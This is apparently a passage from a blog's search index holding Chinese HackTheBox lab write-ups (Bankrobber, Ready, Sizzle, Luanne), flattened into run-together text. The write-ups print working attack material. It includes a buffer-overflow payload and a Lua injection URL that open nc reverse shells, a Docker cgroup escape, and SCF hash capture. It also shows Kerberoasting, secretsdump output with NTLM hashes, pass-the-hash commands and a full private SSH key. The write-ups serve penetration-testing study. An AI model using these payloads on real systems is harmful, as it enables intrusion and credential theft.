TCP [::]:80 [::]:0 LISTENING 3364 TCP [::]:135 [::]:0 LISTENING 732 TCP [::]:443 [::]:0 LISTENING 3364 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:3306 [::]:0 LISTENING 3388 TCP [::]:49664 [::]:0 LISTENING 444 TCP [::]:49665 [::]:0 LISTENING 892 TCP [::]:49666 [::]:0 LISTENING 876 TCP [::]:49667 [::]:0 LISTENING 1340 TCP [::]:49668 [::]:0 LISTENING 576 TCP [::]:49669 [::]:0 LISTENING 584 tasklist123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354tasklistImage Name PID Session Name Session# Mem Usage========================= ======== ================ =========== ============System Idle Process 0 0 4 KSystem 4 0 140 Ksmss.exe 288 0 1.188 Kcsrss.exe 360 0 8.324 Kwininit.exe 444 0 5.296 Kcsrss.exe 452 1 4.140 Kwinlogon.exe 520 1 13.744 Kservices.exe 576 0 7.696 Klsass.exe 584 0 13.052 Ksvchost.exe 668 0 14.652 Ksvchost.exe 732 0 9.084 Kdwm.exe 824 1 30.176 Ksvchost.exe 876 0 50.968 Ksvchost.exe 892 0 16.632 Ksvchost.exe 904 0 24.436 Ksvchost.exe 936 0 16.752 Ksvchost.exe 392 0 16.804 Ksvchost.exe 1052 0 16.520 Ksvchost.exe 1100 0 7.928 Ksvchost.exe 1196 0 7.124 Kspoolsv.exe 1340 0 15.596 Kbankv2.exe 1572 0 80 Ksvchost.exe 1624 0 20.816 Ksvchost.exe 1652 0 10.156 Kvmtoolsd.exe 1780 0 23.688 KVGAuthService.exe 1788 0 13.024 KMemory Compression 1904 0 34.376 Kxampp-control.exe 2224 0 2.912 KWmiPrvSE.exe 2364 0 19.144 Kdllhost.exe 2436 0 13.020 Kmsdtc.exe 2612 0 10.180 KLogonUI.exe 2780 1 49.004 KSearchIndexer.exe 2864 0 18.632 Kconhost.exe 2276 0 560 Khttpd.exe 3364 0 36 Kconhost.exe 3372 0 48 Kmysqld.exe 3388 0 14.748 Kconhost.exe 3400 0 112 Khttpd.exe 3724 0 6.868 Ksvchost.exe 3544 0 7.076 Ksedsvc.exe 2788 0 8.488 Ksvchost.exe 3688 0 8.296 Kcmd.exe 1692 0 2.772 Kconhost.exe 1504 0 4.188 Kpowershell.exe 3012 0 6.784 Kn.exe 2420 0 3.936 Kcmd.exe 4236 0 3.116 KSearchProtocolHost.exe 1524 0 10.764 KSearchFilterHost.exe 1292 0 6.336 Ktasklist.exe 4424 0 7.784 K bankv2首先脚本爆破出来pin码是0021: 使用正确的pin码测试功能： overflow如果输入长字符串，会发现覆盖了内部调用的程序，基础的溢出： 那就是常规的确认偏移，构造payload： 1234➜ ~ msf-pattern_create -l 40Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A➜ ~ msf-pattern_offset -q 0Ab1[*] Exact match at offset 32 exploit就直接修改为使用我们前面传的nc反弹shell,system权限： 12python -c 'print \"A\"*32 + \"\\\\Users\\\\Cortin\\\\AppData\\\\Local\\\\Temp\\\\n.exe -e cmd.exe 10.10.14.15 4446\"'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\Users\\Cortin\\AppData\\Local\\Temp\\n.exe -e cmd.exe 10.10.14.15 4446 brute.py1234567891011121314151617#!/usr/bin/env python3import socketimport sysfor i in range(10000): sys.stdout.write(f\"\\rTrying: &#123;i:04d&#125;\") s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(('localhost', 910)) s.recv(4096) s.send(f\"&#123;i:04d&#125;\\n\".encode()) resp = s.recv(4096) if not b\"Access denied\" in resp: print(f\"\\rFound pin: &#123;i:04d&#125;\") break s.close() root flag之后就直接在admin桌面得到root.txt: 参考资料 HTB: Bankrobber | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html https://www.hackthebox.eu/home/machines/writeup/209 HackTheBox - BankRobber - YouTubehttps://www.youtube.com/watch?v=zYmA9ECuCio&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Ready - HackTheBox","slug":"Ready-HackTheBox","date":"2020-12-16T07:13:30.000Z","updated":"2021-05-17T00:50:08.069Z","comments":true,"path":"2020/12/16/Ready-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/12/16/Ready-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/304 10.10.10.220 端口扫描22和5080: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.10.220Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-16 14:23 CSTNmap scan report for 10.10.10.220Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)5080/tcp open http nginx| http-robots.txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile| /dashboard /projects/new /groups/new /groups/*/edit /users /help|_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://10.10.10.220:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.61 seconds 5080是一个gitlab： 随意注册账号登录，help界面得到版本号： gitlab rce 这个版本的gitlab存在已知漏洞，以前real world ctf考过： GitLab 11.4.7 Remote Code Executionhttps://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Executionhttps://github.com/mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Execution 可以一步步来，也可以exp一键打,打到git shell： 1python3 -c 'import pty; pty.spawn(\"/bin/sh\")' docker 提权 &amp; user flaggitlab是一个docker，在里面查看信息，backup目录里获得密码： 1gitlab_rails[&#39;smtp_password&#39;] &#x3D; &quot;wW59U!ZKMbG9+*#h&quot; 这个密码就是当前docker的root密码,切换过去在用户目录得到user.txt： docker逃逸参考资料： Escaping Docker Privileged Containers | by Vickie Li | Better Programming | Mediumhttps://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1 就是按照教程，把自己的ssh公钥写进宿主机，然后直接ssh连接： 1234567# dockerwget http://10.10.14.10:7777/miao.shchmod +x miao.sh./miao.sh# localssh root@10.10.10.220 miao.sh123456789mkdir /tmp/miao &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/miao &amp;&amp; mkdir /tmp/miao/xecho 1 &gt; /tmp/miao/x/notify_on_releasehost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`echo \"$host_path/cmd\" &gt; /tmp/miao/release_agentecho '#!/bin/sh' &gt; /cmdecho \"echo 'ssh-rsa ***' &gt; /root/.ssh/authorized_keys\" &gt;&gt; /cmdchmod a+x /cmdsh -c \"echo \\$\\$ &gt; /tmp/miao/x/cgroup.procs\" root flag然后直接读取root.txt: 参考资料 GitLab 11.4.7 Remote Code Executionhttps://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Executionhttps://github.com/mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Execution Escaping Docker Privileged Containers | by Vickie Li | Better Programming | Mediumhttps://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1 Hackthebox Ready writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-ready/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sizzle - HackTheBox","slug":"Sizzle-HackTheBox","date":"2020-12-10T07:25:25.000Z","updated":"2020-12-11T00:23:39.894Z","comments":true,"path":"2020/12/10/Sizzle-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/12/10/Sizzle-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.eu/machines/169 10.10.10.103 端口扫描windows服务器： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869$ nmap -sC -sV 10.10.10.103Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 13:23 CSTNmap scan report for 10.10.10.103Host is up (0.073s latency).Not shown: 987 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst:|_ SYST: Windows_NT53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn't have a title (text/html).135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL| Not valid before: 2020-12-09T15:23:10|_Not valid after: 2021-12-09T15:23:10|_ssl-date: 2020-12-10T05:27:01+00:00; 0s from scanner time.443/tcp open ssl/http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn't have a title (text/html).| ssl-cert: Subject: commonName=sizzle.htb.local| Not valid before: 2018-07-03T17:58:55|_Not valid after: 2020-07-02T17:58:55|_ssl-date: 2020-12-10T05:27:00+00:00; 0s from scanner time.| tls-alpn:| h2|_ http/1.1445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL| Not valid before: 2020-12-09T15:23:10|_Not valid after: 2021-12-09T15:23:10|_ssl-date: 2020-12-10T05:27:01+00:00; 0s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL| Not valid before: 2020-12-09T15:23:10|_Not valid after: 2021-12-09T15:23:10|_ssl-date: 2020-12-10T05:27:01+00:00; 0s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL| Not valid before: 2020-12-09T15:23:10|_Not valid after: 2021-12-09T15:23:10|_ssl-date: 2020-12-10T05:27:01+00:00; 0s from scanner time.Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-12-10T05:26:21|_ start_date: 2020-12-09T07:32:52Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 190.49 seconds 21FTP可以匿名登录，但没东西： 80一张gif： 445smb发现一些信息： 12345678910111213➜ ~ smbclient -N -L //10.10.10.103 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share CertEnroll Disk Active Directory Certificate Services share Department Shares Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share Operations Disk SYSVOL Disk Logon server shareSMB1 disabled -- no workgroup available Department Sharessmb只有department可以访问，挂载方便查看内容： 1mount -t cifs -o rw,username&#x3D;guest,password&#x3D; &#39;&#x2F;&#x2F;10.10.10.103&#x2F;Department Shares&#39; &#x2F;mnt ZZ_ARCHIVE很多都是空目录，只有ZZ_ARCHIVE里有东西，自动化脚本检查： PublicPublic也是可写的，并且存在自动清理机制，写进去的文件会每4分钟被清除一次 writeable.sh12345678910#!/bin/bashlist=$(find /mnt -type d)for d in $listdo touch $d/x 2&gt;/dev/null if [ $? -eq 0 ] then echo $d \" is writable\" fidone SCF Attack参考资料： SMB Share – SCF File Attacks – Penetration Testing Labhttps://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ 就是写进去一个scf文件，自动清理机制是其他用户进行的，当进入目录浏览共享会自动执行，从而使得我们得到该用户的hash 把scf文件写进去，开启responder监听，等几分钟得到hash 123cp miao.scf /mnt/Users/Publicsudo responder -I tun0 john然后可以破解出来密码： 123456789➜ Sizzle sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusAshare1972 (amanda)1g 0:00:00:59 DONE (2020-12-03 02:50) 0.01694g/s 193435p/s 193435c/s 193435C/s Ashiah08..ArsenicUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed 但这个密码不能直接远程登录，应该是别的地方用到的 miao.scf1234[Shell]Command&#x3D;2IconFile&#x3D;\\\\10.10.14.5\\icon 目录扫描443端口也开着的，使用IIS相关字典扫描得到结果： 1234567➜ Sizzle gobuster dir -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 50//certsrv/ (Status: 401)//aspnet_client/ (Status: 403)//certenroll/ (Status: 403)//certsrv/mscep_admin (Status: 401)//certsrv/mscep/mscep.dll (Status: 401) 可以使用前面的账号密码登录进去： 这是Active Directory证书服务中证书注册Web服务 Certificate Enrollment Web Services in Active Directory Certificate Services - TechNet Articles - United States (English) - TechNet Wikihttps://social.technet.microsoft.com/wiki/contents/articles/7734.certificate-enrollment-web-services-in-active-directory-certificate-services.aspx certsrv之后就是利用证书管理功能，生成可用于身份验证为amanda的证书： 1openssl req -new -newkey rsa:2048 -nodes -keyout miao.key -out miao.csr 然后网页上Request a certificate -&gt; advanced certificate request, 把自己生成的csr内容粘贴进去，模板xuanzeuser，Submit： 然后下载证书，要base64编码的： winrm然后用证书通过winrm连接,getshell： winrm_shell.rb123456789101112131415161718192021222324252627require 'winrm'# Author: Alamotconn = WinRM::Connection.new( endpoint: 'https://10.10.10.103:5986/wsman', transport: :ssl, client_cert: 'certnew.cer', client_key: 'miao.key', key_pass: '123456', :no_ssl_peer_verification =&gt; true)command=\"\"conn.shell(:powershell) do |shell| until command == \"exit\\n\" do output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\") print(output.output.chomp) command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \"Exiting with code #&#123;output.exitcode&#125;\"end amanda –&gt; mrlky这一步就是Kerberoasting，88端口在本地的，可以转发出去方便操作,拿到mrlky用户hash，破解密码，之后同样的方式给mrlky生成证书，winrm连接，得到user.txt： 123456789101112# iwr -uri http://10.10.14.15:3000/chisel.exe -outfile c.exe# powershell命令限制wget http://10.10.14.15:3000/chisel.exe -OutFile chisel.exe# target./chisel.exe client 10.10.14.15:8008 R:88:127.0.0.1:88 R:389:localhost:389# localchisel server -p 8008 --reversepython3 GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda mrlky –&gt; administrator和后面一样，mrlky用户身份进行secretdump，拿到Administrator用户hash，然后PTH getshell 非预期？file.txtC:\\Windows\\system32里有个file.txt，里面是hash： 可以解出来密码： Football#7 secretdump然后直接用解出来的密码dump其他用户hash： 1python3 secretsdump.py 10.10.10.103/mrlky:Football#7@10.10.10.103 123456Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef::: PTH然后直接使用Administrator用户hash即可得到shell： 1python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 Administrator@10.10.10.103 flags12type C:\\Users\\mrlky\\Desktop\\user.txttype C:\\Users\\Administrator\\Desktop\\root.txt 参考资料 SMB Share – SCF File Attacks – Penetration Testing Labhttps://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ Certificate Enrollment Web Services in Active Directory Certificate Services - TechNet Articles - United States (English) - TechNet Wikihttps://social.technet.microsoft.com/wiki/contents/articles/7734.certificate-enrollment-web-services-in-active-directory-certificate-services.aspx HTB: Sizzle | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/06/01/htb-sizzle.html https://www.hackthebox.eu/home/machines/writeup/169 HackTheBox - Sizzle - YouTubehttps://www.youtube.com/watch?v=YVhlfUvsqYc&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Luanne - HackTheBox","slug":"Luanne-HackTheBox","date":"2020-12-08T08:05:54.000Z","updated":"2021-03-29T00:33:28.904Z","comments":true,"path":"2020/12/08/Luanne-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/12/08/Luanne-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/302 10.10.10.218 端口扫描22,80,9001: 1234567891011121314151617181920212223242526272829$ nmap -sC -sV 10.10.10.218Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-08 14:41 CSTNmap scan report for 10.10.10.218Host is up (0.067s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)| ssh-hostkey:| 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)80/tcp open http nginx 1.19.0| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=.| http-robots.txt: 1 disallowed entry|_/weather|_http-server-header: nginx/1.19.0|_http-title: 401 Unauthorized9001/tcp open http Medusa httpd 1.12 (Supervisor process manager)| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=default|_http-server-header: Medusa/1.12|_http-title: Error responseService Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsdService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 202.72 seconds 80需要认证信息，认证失败显示是3000端口： 90019001也是需要认证： 目录扫描根据前面扫描结果，80端口有robots.txt，显示有/weather目录，但直接访问是404： 那就进一步目录扫描,得到结果： 123gobuster dir -u http:&#x2F;&#x2F;10.10.10.218&#x2F;weather&#x2F; -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt -t 50&#x2F;forecast (Status: 200) weather/forecast直接访问给出提示信息，需要参数： 看起来就是一个天气预报API： Lua代码注入随意参数构造注入，得到报错，是Lua： 尝试闭合，可以执行其他lua代码： reverse shell那就是直接lua执行系统命令，得到reverse shell,注意需要url编码，因为有&amp;字符影响,只把它编码成%26就可以： 1http:&#x2F;&#x2F;10.10.10.218&#x2F;weather&#x2F;forecast?city&#x3D;London&#39;);os.execute(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.5 4445 &gt;&#x2F;tmp&#x2F;f&quot;)-- 打到_httpd用户shell： 用户信息.htpasswd有个.htpasswd文件，里面有用户名和密码hash： 破解出来是’iamthebest’: 123456789101112➜ Luanne sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt[sudo] password for miao:Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusiamthebest (?)1g 0:00:00:00 DONE (2020-12-02 19:03) 25.00g/s 76800p/s 76800c/s 76800C/s secrets..ANTHONYUse the \"--show\" option to display all of the cracked passwords reliablySession completed 这个账号密码可以登录前面的80(用户名也说明了是webapi_user)： port 3001netstat发现3001端口，3000就是外面的80: 直接访问是401，前面得到的账号密码可以使用： get id_rsa3001不存在前面3000的代码注入，根据论坛一些提示信息可以得到用户私钥内容： 123curl --user webapi_user:iamthebest http:&#x2F;&#x2F;127.0.0.1:3001&#x2F;~r.michaels&#x2F;.ssh&#x2F;id_rsacurl --user webapi_user:iamthebest http:&#x2F;&#x2F;127.0.0.1:3001&#x2F;~r.michaels&#x2F;id_rsa id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFBIcxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv&#x2F;iRKyPPvFGTVWvxDXFTKWXh0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar&#x2F;I&#x2F;j7c87SY59uRnHQkzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchDryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyKBNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk&#x2F;DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t83CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3&#x2F;IdH5+zj1BTHZXEpXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL&#x2F;4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4IGBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq&#x2F;yP4+3PO0mOfbkZx0JM0V3r7T0lF8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsbKnmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaaPOZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3GDD5c1UQXB6dNA3S5OHArao&#x2F;nYmZkfDK16JEkfMuV6g9&#x2F;yHR+fs49QUx2VxKV16lRRQeyWnvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdmxGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYPDE&#x2F;9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolXer2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV&#x2F;Wx+oVG6nNdBeFEuz&#x2F;BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+suo624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs&#x2F;ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8Pm&#x2F;+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAAwFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP&#x2F;wQhjnZcfUXn0WDQKCbVnOp6LmyabN2lPPD3zRtRj5O&#x2F;sLee68xZHr09I&#x2F;Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv+ztOM&#x2F;3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl&#x2F;zwZKkvIXtqu+WXXpFxXOP9qcf2jJom8mmRLvGFOe0akCBV2NCGq&#x2F;nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj&#x2F;6raALAYcOD1UZwPTuJHZ&#x2F;89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07&#x2F;S7khHSPXoJD0DjXAIZkN+59o58CG82wvGl2RnwIpIOIFPoQyim&#x2F;T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgoIH3BXK8fc7hLQw58o5kwdFakClbs&#x2F;q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPgnUtRpvXwMi0&#x2F;QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQgQLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp99OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG-----END OPENSSH PRIVATE KEY----- user flag然后以r.michaels身份ssh登录，得到user.txt: 解释这里太CTF了，正常基本不会有配置吧 1&#x2F;usr&#x2F;libexec&#x2F;httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather &#x2F;home&#x2F;r.michaels&#x2F;devel&#x2F;webapi&#x2F;weather.lua -P &#x2F;var&#x2F;run&#x2F;httpd_devel.pid -U r.michaels -b &#x2F;home&#x2F;r.michaels&#x2F;devel&#x2F; 主要是因为apache的mod_userdir模块，r.michaels用户目录中有public_html目录，这样当访问~r.michaels时就相当于访问r.michaels/public_html mod_userdir - Apache HTTP サーバ バージョン 2.4https://httpd.apache.org/docs/2.4/mod/mod_userdir.html 直接： 1curl --user webapi_user:iamthebest http:&#x2F;&#x2F;127.0.0.1:3001&#x2F;~r.michaels&#x2F; 也可以看到public_html下的id_rsa，然后直接去读： 提权信息backups里面有个tar.gz.enc文件，需要先解密： 搜索发现这应该是gpg加密，服务器上也发现相关程序： decrypt解密后解压，因为这就是一个备份，那就还是先看.htpasswd，得到一个不同的hash： 123456netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gzcd /tmptar -xf devel_backup-2020-09-16.tar.gzcd devel-2020-09-16cd wwwcat .htpasswd 破解出来密码： 123456789101112➜ Luanne sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt[sudo] password for miao:Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuslittlebear (?)1g 0:00:00:00 DONE (2020-12-02 19:46) 1.041g/s 13600p/s 13600c/s 13600C/s tormenta..hello11Use the \"--show\" option to display all of the cracked passwords reliablySession completed root flag这个密码就是root密码，但su和sudo不能用，搜索文档发现可以用doas切到root,读取root.txt： doas(1) - OpenBSD manual pageshttps://man.openbsd.org/doas.1 参考资料 mod_userdir - Apache HTTP サーバ バージョン 2.4https://httpd.apache.org/docs/2.4/mod/mod_userdir.html doas(1) - OpenBSD manual pageshttps://man.openbsd.org/doas.1 Hackthebox Luanne writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-luanne/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"CrossFit - 